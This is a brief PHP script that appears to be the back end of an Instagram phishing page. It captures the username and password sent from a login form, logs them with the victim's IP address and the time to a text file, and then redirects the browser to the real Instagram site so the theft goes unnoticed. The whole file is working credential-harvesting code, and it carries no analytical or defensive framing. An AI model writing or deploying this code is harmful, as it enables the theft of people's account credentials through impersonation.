<?php
$file = "data.txt";
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$text = "Time: $time\nIP: $ip\nUser: $username\nPass: $password\n----------------\n";
file_put_contents($file, $text, FILE_APPEND);

header('Location: https://www.instagram.com');
exit;
?>
